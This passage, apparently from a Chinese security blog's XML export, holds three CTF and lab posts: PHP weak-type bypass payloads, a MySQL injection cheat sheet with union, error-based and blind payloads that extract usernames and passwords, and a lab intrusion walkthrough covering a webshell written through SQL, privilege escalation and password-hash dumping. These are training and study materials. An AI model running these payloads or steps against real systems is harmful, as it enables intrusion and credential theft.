<p>有NULL只参与运算时，NULL转换为整型0进行运算。</p>
<p>有整型与浮点型参与运算时，将整型转换为浮点型进行运算。</p>
<p>有字符串型与数字类型的数据进行运算时，将字符串转换为数字类型进行运算。如：<br>“123abc”转化为123,”123.456abc”转换为123.456，”abc”转换为整型0。</p>
<h3 id="php中的运算符"><a href="#php中的运算符" class="headerlink" title="php中的运算符"></a>php中的运算符</h3><p>首先看如下代码：</p>
<pre><code>&lt;?php
$a = 0;

var_dump( $a &gt; 0);
var_dump( $a &lt; true);
var_dump( $a &gt;= 0.01);
var_dump( $a &lt;= &quot;0.10yuan&quot;);
var_dump( $a = 0);
var_dump( $a == 0);
var_dump( $a == &quot;0&quot;);
var_dump( $a === &quot;0&quot;);
var_dump( $a === 0);
var_dump( $a &lt;&gt; 0);
var_dump( $a != 0);
var_dump( $a != 1);
?&gt;
</code></pre><p>输出如下：<br>  <img src="http://ourd90bac.bkt.clouddn.com/php.jpg" alt=""></p>
<p>可见当<code>$a == &quot;0&quot;</code>输出正确，而<code>$a === &quot;0&quot;</code>却是错误的。这是为什么呢？原因就在于php中“==”与“===”的区别。前者是一种模糊等于，只会比较内容的值，不会比较内容的类型，也就是后面提到了松散比较。而后者是一种严格的等于判断，会将内容与内容类型都进行判断。这是php作为弱类型语言的一种特点。</p>
<p>接下来将用一道CTF题来了解下实际情况中常见的php弱类型。</p>
<h2 id="php源码分析"><a href="#php源码分析" class="headerlink" title="php源码分析"></a>php源码分析</h2><blockquote>
<p>整型与字符串的纠葛<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">show_source(<span class="keyword">__FILE__</span>); </div><div class="line">$a=<span class="number">0</span>; </div><div class="line">$b=<span class="number">0</span>; </div><div class="line">$c=<span class="number">0</span>; </div><div class="line">$d=<span class="number">0</span>; </div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'x1'</span>])) </div><div class="line">&#123; </div><div class="line">        $x1 = $_GET[<span class="string">'x1'</span>]; </div><div class="line">        $x1==<span class="string">"1"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </div><div class="line">        <span class="keyword">switch</span> ($x1) </div><div class="line">        &#123; </div><div class="line">        <span class="keyword">case</span> <span class="number">0</span>: </div><div class="line">        <span class="keyword">case</span> <span class="number">1</span>: </div><div class="line">                $a=<span class="number">1</span>; </div><div class="line">                <span class="keyword">break</span>; </div><div class="line">        &#125; </div><div class="line">&#125; </div><div class="line">$x2=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'x2'</span>]); </div><div class="line"><span class="keyword">if</span>(is_array($x2))&#123; </div><div class="line">    is_numeric(@$x2[<span class="string">"x21"</span>])?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </div><div class="line">    <span class="keyword">if</span>(@$x2[<span class="string">"x21"</span>])&#123; </div><div class="line">        ($x2[<span class="string">"x21"</span>]&gt;<span class="number">2017</span>)?$b=<span class="number">1</span>:<span class="keyword">NULL</span>; </div><div class="line">    &#125; </div><div class="line">    <span class="keyword">if</span>(is_array(@$x2[<span class="string">"x22"</span>]))&#123; </div><div class="line">        <span class="keyword">if</span>(count($x2[<span class="string">"x22"</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array($x2[<span class="string">"x22"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"ha?"</span>); </div><div class="line">        $p = array_search(<span class="string">"XIPU"</span>, $x2[<span class="string">"x22"</span>]); </div><div class="line">        $p===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </div><div class="line">        <span class="keyword">foreach</span>($x2[<span class="string">"x22"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123; </div><div class="line">            $val===<span class="string">"XIPU"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </div><div class="line">        &#125; </div><div class="line">        $c=<span class="number">1</span>; </div><div class="line">&#125; </div><div class="line">&#125; </div><div class="line">$x3 = $_GET[<span class="string">'x3'</span>]; </div><div class="line"><span class="keyword">if</span> ($x3 != <span class="string">'15562'</span>) &#123; </div><div class="line">    <span class="keyword">if</span> (strstr($x3, <span class="string">'XIPU'</span>)) &#123; </div><div class="line">        <span class="keyword">if</span> (substr(md5($x3),<span class="number">8</span>,<span class="number">16</span>) == substr(md5(<span class="string">'15562'</span>),<span class="number">8</span>,<span class="number">16</span>)) &#123; </div><div class="line">            $d=<span class="number">1</span>; </div><div class="line">        &#125; </div><div class="line">    &#125; </div><div class="line">&#125; </div><div class="line"><span class="keyword">if</span>($a &amp;&amp; $b &amp;&amp; $c &amp;&amp; $d)&#123; </div><div class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>; </div><div class="line">    <span class="keyword">echo</span> $flag; </div><div class="line">&#125; </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
</blockquote>
<p>首先通读全部代码，这里得到flag的条件是变量<code>$a、$b、$c、$d</code>的值都要等于1。</p>
<h3 id="分步解题"><a href="#分步解题" class="headerlink" title="分步解题"></a>分步解题</h3><ul>
<li><code>$a = 1</code></li>
</ul>
<p>要使变量等于1，要经过两层比较。首先在<code>$x1 == 1</code>的松散比较中要不等于”1”，这个很好过，任意不为1的值都可以。然后将<code>NULL</code>赋给<code>$x1</code>。接着进行了一次<code>switch</code>语句的比较。按照官方文档的说法,Switch中为确保精度，建议只使用比较整型和字符串。但由于php弱语言的缘故，所以也可以使用任意类型进行比较。那么这里我们<code>$x1</code>为<code>NULL</code>值就会和整型0进行一次松散的双等比较，于是为<code>true</code>。最终<code>$a = 1</code>。</p>
<ul>
<li><code>$b = 1</code>与<code>$c = 1</code></li>
</ul>
<p>源代码程序继续往下读，首先<code>json_decode</code>将传入的<code>$x2</code>数据进行json格式编码，说明我们需要传入一个数组，用的是json格式。接着<code>is_numeric</code>和与整型2017的判断是php弱类型题中的典型判断。由前面提到的整型与字符串型的比较知识中我们不难构造”2018a”这样的形式来绕过这里的判断使<code>$b = 1</code>。接着使用<code>array_search</code>函数对<code>$x2[&quot;x22&quot;]</code>进行匹配。但是同样的，在php函数中<code>array_search</code>函数进行的匹配也是通过松散的双等比较进行的，这里如果数组里有一个0值，字符串”XIPU”就会通过双等自动转换为0，从而匹配成功。综上，所以我们这里构造payload为<code>x2={&quot;x21&quot;:&quot;2018a&quot;;&quot;x22&quot;:[[1],0]}</code>就可以成功绕过了。</p>
<ul>
<li><code>$c = 1</code></li>
</ul>
<p>这里运用的是php中0e弱类型比较，只要是0e开头的字符串在双等的松散判断下都是相等的，这里涉及md5加密，直接截取它的代码，修改下成小脚本跑一下就出来了。</p>
<p>全部的payload为：<code>?x1=a1&amp;x2={&quot;x21&quot;:&quot;2018a&quot;,&quot;x22&quot;:[[1],0]}&amp;x3=XIPU18570</code></p>
<p><strong>小结</strong>：以上的弱类型转换中是整型与字符串类型的转换。</p>
<blockquote>
<p>数组与字符串的纠葛</p>
</blockquote>
<p>看以下源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">   <span class="keyword">if</span>(!strcmp($c[<span class="number">1</span>],$d) &amp;&amp; $c[<span class="number">1</span>]!==$d)&#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"You in,You win"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"Get out!"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>源码中使用<code>strcmp</code>函数对变量<code>$c</code>与<code>$d</code>进行比较，其特点是将两个变量转换为ascii码后进行前者减后者，并返回一个int类型的相减后的结果。这样我们不难发现，<code>strcmp</code>在比较数字类型与字符串类型时，返回的数据都是正常的，但是一旦遇到其中数组类型的比较呢？答案是NULL<br>所以我们这里构造数组与其比较就会构造成恒为真，从而绕过判断，进入if中。</p>
<p><strong>补充</strong>：php中数组转换成其他类型的后的值：</p>
<p>Array转换整型int/浮点型float会返回元素个数；<br>转换bool返回Array中是否有元素；转换成string返回’Array’，并抛出warning。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>从上面这个例子可以看出php弱类型的成因在其对数据类型的处理上，体现在存在双等松散比较的条件判断与函数判断中。</p>
<p>其实php对字符串的自动转化相当于使用<code>intval()</code>函数对字符串进行强制转换，只要存在字符串与数字类型的双等松散比较中就存在这种强制转换。造成这种现象的原因就在于php内核中对弱类型的封装，其存在于<code>zval</code>结构中：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> _zval_struct zval;</div><div class="line">	<span class="keyword">struct</span> _zval_struct &#123;  </div><div class="line">    <span class="comment">/* Variable information */</span>  </div><div class="line">    zvalue_value value;     <span class="comment">/* value */</span>  </div><div class="line">    zend_uint refcount__gc;  </div><div class="line">    zend_uchar type;    <span class="comment">/* active type */</span>  </div><div class="line">    zend_uchar is_ref__gc;  </div><div class="line">	&#125;;  </div><div class="line"></div><div class="line">	<span class="keyword">typedef</span> <span class="keyword">union</span> _zvalue_value &#123;  </div><div class="line">    <span class="keyword">long</span> lval;  <span class="comment">/* long value */</span>  </div><div class="line">    <span class="keyword">double</span> dval;    <span class="comment">/* double value */</span>  </div><div class="line">    <span class="keyword">struct</span> &#123;  </div><div class="line">        	<span class="keyword">char</span> *val;  </div><div class="line">        	<span class="keyword">int</span> len;  </div><div class="line">    	&#125; str;  </div><div class="line">    HashTable *ht;  <span class="comment">/* hash table value */</span>  </div><div class="line">    zend_object_value obj;  </div><div class="line">	&#125; zvalue_value;</div></pre></td></tr></table></figure>]]></content>
      
        
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> CTF </tag>
            
            <tag> php </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MySql 注入杂记]]></title>
      <url>/2017/10/06/MySQL%E6%B3%A8%E5%85%A5%E6%9D%82%E8%AE%B0/</url>
      <content type="html"><![CDATA[<h1 id="MySQL注入杂记"><a href="#MySQL注入杂记" class="headerlink" title="MySQL注入杂记"></a>MySQL注入杂记</h1><p><img src="http://ourd90bac.bkt.clouddn.com/mysql.jpg" alt=""></p>
<h2 id="1-基础知识准备："><a href="#1-基础知识准备：" class="headerlink" title="1.基础知识准备："></a>1.基础知识准备：</h2><h3 id="sql注入的分类"><a href="#sql注入的分类" class="headerlink" title="sql注入的分类"></a>sql注入的分类</h3><ul>
<li>基于从服务器的响应：<br>1.基于错误的sql注入；<br>2.联合查询的类型；<br>3.SQL盲注：<pre><code>基于布尔的盲注
基于时间的盲注
基于报错的盲注
</code></pre><a id="more"></a></li>
<li><p>基于注入的数据类型：<br>1.基于字符串<br>2.基于数字</p>
</li>
<li><p>基于程度和顺序<br>1.一阶注入；<br>2.二阶注入；<br>3.</p>
</li>
<li>基于注入位置<br>1.基于用户输入表单域的注入；<br>2.通过cookie注入；<br>3.通过服务器变量注入。（基于头部信息注入）</li>
</ul>
<h3 id="MySQL系统函数"><a href="#MySQL系统函数" class="headerlink" title="MySQL系统函数"></a>MySQL系统函数</h3><p>1.version() :mysql版本信息<br>2.user():数据库用户名<br>3.database():数据库名<br>4.@@datadir():数据库路径<br>5.@@version_compile_os():操作系统版本</p>
<p>###函数介绍<br>1.concat(str1,str2,….):没有分隔符地连接字符串<br>2.concat_ws(separator.str1,str2,…)含有分隔符地连接字符串<br>3.group_concat(str1,str2,…):连接一族所有的字符串，并用逗号分隔</p>
<h2 id="2-GET联合查询（有回显报错）"><a href="#2-GET联合查询（有回显报错）" class="headerlink" title="2.GET联合查询（有回显报错）"></a>2.GET联合查询（有回显报错）</h2><p>1.测试<code>id</code>值后的闭合符号，以及注释符。</p>
<blockquote>
<p>常见注释：<br>–+<br>#<br>`</p>
</blockquote>
<p>2.<code>order by</code>联合查询，找出相应的列数</p>
<p>3.<code>union select</code>联合查询注入。如下：</p>
<p><strong>查询所有数据库</strong>：<code>id=-1&#39; union select 1, group_concat(table_schema),3 from information_schema.schemata--+</code></p>
<p>注：这里我们假设查询出<code>security</code>数据库</p>
<p><strong>查询表名（table）</strong>：<code>id=-1&#39; union select 1, group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+</code></p>
<p><strong>查询列名（column）</strong>：<code>id=-1&#39; union select 1, group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;--+</code></p>
<p><strong>查询字段名</strong>：<code>id=-1 union select 1,username,password from users where id=2--+</code></p>
<p>##3. GET报错注入（无回显）<br>此种注入时区别于上一种联合查询的有回显报错的，此种无回显报错注入只能用到另外的函数来进行报错回显注入。</p>
<ul>
<li><p><code>extractvalue</code><br>其核心的语句大家都应该能看出是<code>select</code>后查询语句。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">#爆数据库</div><div class="line">and extractvalue(0x0a,concat(0x0a,(select database())))-- </div><div class="line">#爆表</div><div class="line">and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))-- </div><div class="line">#爆列</div><div class="line">and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name=’users’ limit 0,1)))-- </div><div class="line">#爆字段</div><div class="line">and extractvalue(0x0a,concat(0x0a,(select count(username,0x3a,password) from users limit 0,1)))--</div></pre></td></tr></table></figure>
</li>
<li><p><code>updatexml</code><br>与上面的<code>extractvalue</code>相差不大</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and 1=(updatexml(0x3a,concat(1,(<span class="keyword">select</span> <span class="keyword">database</span>())),<span class="number">1</span>))<span class="comment">--</span></div></pre></td></tr></table></figure>
</li>
<li><p><code>floor</code><br>同上</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">union+<span class="keyword">select</span>+<span class="number">1</span>+<span class="keyword">from</span>+(<span class="keyword">select</span>+<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>),(<span class="keyword">select</span>+table_name+<span class="keyword">from</span>+information_schema.tables+<span class="keyword">where</span>+table_schema=<span class="keyword">database</span>()+<span class="keyword">limit</span>+<span class="number">0</span>,<span class="number">1</span>))a+<span class="keyword">from</span>+information_schema.tables+<span class="keyword">group</span>+<span class="keyword">by</span>+a)b</div></pre></td></tr></table></figure>
</li>
</ul>
<p>##4. 盲注的相关知识</p>
<ul>
<li>基于布尔盲注—–构造逻辑结构判断</li>
</ul>
<p>相关字符串截取函数：<br>1.<code>left(database(),1)&gt;&#39;s&#39;</code>   ：database()显示数据库名，left(a,b)从左侧截取a的前b位<br>2.<code>ascii(substr(select table_name from information_schema.tables where table_schema = database() limit 0,1)1,1)--+</code>：substr(a,b,c)从b位置开始，截取字符串a的c长度，ascii()将字符转换为ascii码格式。</p>
<blockquote>
<p><code>substr()</code>的小技巧：例如在<code>substr(database(),1,1)</code>中逗号被过滤了，我们可以使用<code>from 1 to 1</code>来绕过过滤。<br>那么有同样格式的<code>limit 0,1</code>有没有这样的绕过呢？当然有。格式为：<code>1 offset 0</code>这里注查询数字的顺序。</p>
</blockquote>
<p>3.<code>ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER
BY id LIMIT 0,1),1,1))&gt;98%23</code>: mid(a,b,c)从位置b开始，截取字符串a的c位。ord()函数和ascii()函数一样将字符转为ascii码。</p>
<ul>
<li>基于报错的MySQL盲注</li>
<li>基于时间的盲注<br><code>if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</code>if(a,b,c)若a成立，就执行c，不成立就执行b</li>
</ul>
<h3 id="GET布尔盲注"><a href="#GET布尔盲注" class="headerlink" title="GET布尔盲注"></a>GET布尔盲注</h3><ul>
<li><p>判断数据库<br>可以使用两种函数判断：<br>1.<code>id=1&#39; and left(database(),1)=&#39;s&#39;--+</code>：直接判断数据库的名字，缺点就是受限于left函数的用法，不能进行每一位的单个字符的判断。<br>2.<code>id=1&#39; and ascii(substr(database(),1,1))=89--+</code>：和上面的语句一样用于判断数据库名，在使用脚本时用此句就行。</p>
</li>
<li><p>爆数据库下的表名<br><code>id=1&#39; and ascii(substr(select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=136--+</code><br><em>解释</em>：<code>limit 0,1</code>中0是表示从第一个表（若数据库有多个表）开始，接着的1表示获取第一个。</p>
</li>
<li><p>获取字段内的值（获取字段名就和上面获取表名的操作是一样的）<br>假设我们从上一步的操作中获取了一个名叫<code>users</code>的字段，一般想来这个字段中肯定含有我们想要得到的用户名和密码，所以这里就可以用到正则注入。</p>
</li>
</ul>
<p>1.<code>id=1&#39; and 1=(select 1 frominformation schema.columns where table_name=&#39;users&#39; and column_name regexp &#39;^us[a-z]&#39; limit 0,1)--+</code></p>
<p><strong>注意</strong>：select后的1表示我们查询的是这个字段的第一个值，若我们想查询其他字段中的值，直接更换这里的’users’即可，所以这里的limit 0,1起不到限定作用，可有可无。</p>
<p>2.使用<code>ord()</code>与<code>mid()</code>函数</p>
<p>解释：这里的mid()函数与substr()函数类似，有一样的功能。函数原型为：<code>MID(ColumnName, Start [, Length])</code>对字符串从start位置开始截取相应的长度。这里我就可以在substr()被禁的情况下做替换。</p>
<h2 id="4-POST注入"><a href="#4-POST注入" class="headerlink" title="4.POST注入"></a>4.POST注入</h2><p>常见的Post注入分为两类：</p>
<ol>
<li><p>同时验证用户名和密码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$sql = select * from users where username=$usernmae <span class="keyword">and</span> password=$password limit <span class="number">1</span>,<span class="number">1</span></div><div class="line">$result = mysql_query($sql);</div><div class="line"><span class="keyword">if</span>($result) &#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"登陆成功"</span>;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"登陆失败"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>用户名与密码分步验证</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$sql = <span class="string">"select password from users where username='$username'"</span></div><div class="line">$result = mysql_query($sql);</div><div class="line"><span class="keyword">if</span>($result) &#123;</div><div class="line">    $row = mysql_fetch_row($result);</div><div class="line">    $query_password = $row[$password];</div><div class="line">    <span class="comment">#对输入的$password进行变形</span></div><div class="line">    $input_password = modify($passowrd);</div><div class="line">    <span class="keyword">if</span>($input_password == $query_password) &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"登陆成功"</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"密码错误"</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"用户不存在"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ol>
<p>我们在大多数情况下遇到的都是第一种情况，其实第一种情况与第二种情况并无太大区别，就是在查询成功后页面返回不同而已。其余的都和普通的注入一样。这里就不再反复赘述。</p>
]]></content>
      
        
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Blackb0x 服务器渗透]]></title>
      <url>/2017/08/16/Blackb0x-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B8%97%E9%80%8F/</url>
      <content type="html"><![CDATA[<h1 id="一次虚拟机服务器的内网渗透"><a href="#一次虚拟机服务器的内网渗透" class="headerlink" title="一次虚拟机服务器的内网渗透"></a>一次虚拟机服务器的内网渗透</h1><p><img src="http://ourd90bac.bkt.clouddn.com/timg.jpg" alt=""></p>
<blockquote>
<p>D0g3第三次测试的题目，整个题目拥有7个<em>flag</em>。目标主机是一个Windows2003虚拟机，登录密码非弱口令，无法通过字典爆破的形式进行简单的进入，需进行常规的内网渗透程序进行渗透。</p>
</blockquote>
<hr>
<a id="more"></a>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><ul>
<li><strong>获取目标IP</strong><blockquote>
<p>建议VM虚拟机使用桥接的方式，<em>kali</em>虚拟机也是用桥接模式，这样在一个网段才能扫到IP，实验也更贴近实战。</p>
</blockquote>
</li>
</ul>
<p>使用<strong>kali Linux</strong>。终端 <em>netdiscover</em>命令获取同网段的主机IP(192.168.2.116)</p>
<p><img src="http://ourd90bac.bkt.clouddn.com/Kali.png" alt=""></p>
<ul>
<li><strong>端口扫描</strong></li>
</ul>
<p>使用<em>zenmap</em>（nmap的图形化版本）进行端口扫描，扫描参数使用默认的就可以了。扫描结果如下：</p>
<p><img src="http://ourd90bac.bkt.clouddn.com/flag1-1.png" alt=""></p>
<p>从扫描结果可以发现开放了： 21/tcp、80/tcp端口，这两个服务分别对应着<a href="https://baike.baidu.com/item/ftp/13839?fr=aladdin" target="_blank" rel="external">文件传输协议</a>与<a href="https://baike.baidu.com/item/http/243074?fromtitle=%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE&amp;fromid=8535513" target="_blank" rel="external">web</a>服务，即服务器设有网站，并且还发现了一个<em>phpinfo()</em>页面。打开后获得第一条<em>flag</em>。</p>
<p><img src="http://ourd90bac.bkt.clouddn.com/flag1-2.png" alt=""></p>
<p>于是现在就提供了两条思路。1.通过ftp协议进行远程访问，获取服务器的有用信息；2.通过找到服务器搭载的网站进行渗透，getshell后进行提权拿到服务器。</p>
<ul>
<li><strong>目录扫描</strong></li>
</ul>
<p>既然开了80端口，就不得不扫一波目录了。</p>
<p><img src="http://ourd90bac.bkt.clouddn.com/flag2-1.png" alt=""></p>
<p>果然发现有收获：点进<em>192.168.2.116/ftp.rar</em>得到有个ftp程序的压缩包。解压：</p>
<p>即获得第二个flag<br><img src="http://ourd90bac.bkt.clouddn.com/f2.png" alt=""></p>
<p>然后打开第二个文件夹中的ftp软件，在用户设置页面获得第三个flag。</p>
<p><img src="http://ourd90bac.bkt.clouddn.com/flag3.png" alt=""></p>
<h2 id="FTP利用"><a href="#FTP利用" class="headerlink" title="FTP利用"></a>FTP利用</h2><p>前三个flag拿得还是很轻松，基本的信息搜集就可以做到了，心里美滋滋。可是下一步怎么走就比较懵逼了。于是进一步进行搜集（瞎找）。</p>
<p>最后在压缩包的第二个.xml文件中找到了蛛丝马迹。因为这个xml文件是记录着ftp远程连接的用户名和密码，以前在服务器上大马利用ftp提权的时候会专门去找这个文件，这里发现这个文件应该是故意给出下一步渗透的提示，看来思路是正确的。</p>
<p><img src="http://ourd90bac.bkt.clouddn.com/ftp.png" alt=""></p>
<p>找到对应的用户名：<em>admin</em>，解出对应的md5的密码。应该就可以进行远程登陆了。</p>
<p><img src="http://ourd90bac.bkt.clouddn.com/ftp2.png" alt=""></p>
<p>登录之后获得一个hosts.bak的文件。这一步本想是偷懒上传一个五次shift的cmd后门，但是发现ftp链接后的权限被限制为只能读取了，所以感觉比较可惜啊。没办法，只有老老实实把hosts文件复制到本地再研究下了。</p>
<blockquote>
<p>关于hosts文件：hosts文件是电脑中用于对域名进行解析的文件。它的优先级要大于DNS服务器。也就是说，电脑在访问网站时会先根据hosts文件中的域名解析信息寻找目标网址IP，如果没找到才会发给DNS服务器进行解析。</p>
</blockquote>
<p>hosts文件内容如下：</p>
<pre><code>`127.0.0.1 admin.hack.me

 127.0.0.1 cms.hack.me`
</code></pre><p>现在分析下：”127.0.0.1”是服务器的本地地址，也就是服务器内访问admin.hack.me 和cms.hack.me时会被解析到本地(localhost)，也就是说本地一定存在对应这两个网站的网站。（但我扫目录的时候咋没扫出来，至少扫出一个才正常啊…….）</p>
<p>于是将hosts文件内容替换到本地，将 127.0.0.1 替换成目标的IP地址。分别访问，出现以下两个页面：</p>
<p>一个是<em>phpmyadmin</em>管理登录页面;<br>另一个是<em>joomla cms</em>网站的页面;</p>
<p><img src="http://ourd90bac.bkt.clouddn.com/admin.png" alt=""></p>
<p><img src="http://ourd90bac.bkt.clouddn.com/cms.png" alt=""></p>
<p>cms网站看了很久，没有找到版本号，exp那条路基本上比较难，而慢慢测试漏洞去突破显然不如搞phpmyadmin来得好点。所以就暂时放了一放cms。</p>
<p>phpmyadmin这里找了很久没有再发现有什么好的提示，试了下默认密码和匿名登录都不行，那就只有硬着头皮进行弱口令爆破了。于是下载了个phpmyadmin爆破工具，加载字典跑，在经历了近十次的误报后终于爆出了密码，登录进去。发现了第四个<em>flag</em></p>
<p><img src="http://ourd90bac.bkt.clouddn.com/flag3-3.png" alt=""></p>
<p>既然都拿到了root权限的数据库，那就可以找到刚才cms网站的后台密码进行登录，看有没有下一个flag或者在后天上传一句话getshell。<br>后来才发现网站的后台什么都没有，而且基本上没有发现可以很好地插一句话的地方。最后纠结了半天。才发现可以直接在数据库里直接写入一句句话，只要找到网站的绝对路径就可以了。而绝对路径在最初的<em>phpinfo()</em>页面就可以找到。</p>
<p>于是写入一句话：<br><img src="http://ourd90bac.bkt.clouddn.com/sql.png" alt=""></p>
<p>连上菜刀，getshell。并在网站根目录处拿到第五个<em>flag</em>。<br><img src="http://ourd90bac.bkt.clouddn.com/flag5-3.png" alt=""></p>
<hr>
<h2 id="服务器提权"><a href="#服务器提权" class="headerlink" title="服务器提权"></a>服务器提权</h2><p>既然拿到shell了，接下来就是常规的上大马提权服务器了。</p>
<blockquote>
<p>提权的思路一般有两种：1.利用服务器上高权限（主要指system权限）的服务进行提权；2.利用服务器的exp进行提权。</p>
</blockquote>
<p>一开始我想利用较为普遍的mysql数据库提权方式。但在试了udf、mof、nc反弹提权后均没有用，所得的用户都是users权限。最后只有看了下系统的补丁情况：</p>
<p><img src="http://ourd90bac.bkt.clouddn.com/system.png" alt=""></p>
<p>看来这下就可以利用大把的exp进行利用了。百度找到服务器没有打补丁的漏洞exp。利用成功。获取system权限，并创建属于administrator权限的用户，登录成功。</p>
<p>在管理员的文件夹中找到最后两个flag，其中一个加密。应该是要管理员密码。使用pwdump7找到密码的hash，解出hash。</p>
<p>打完收工。</p>
]]></content>
      
        
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
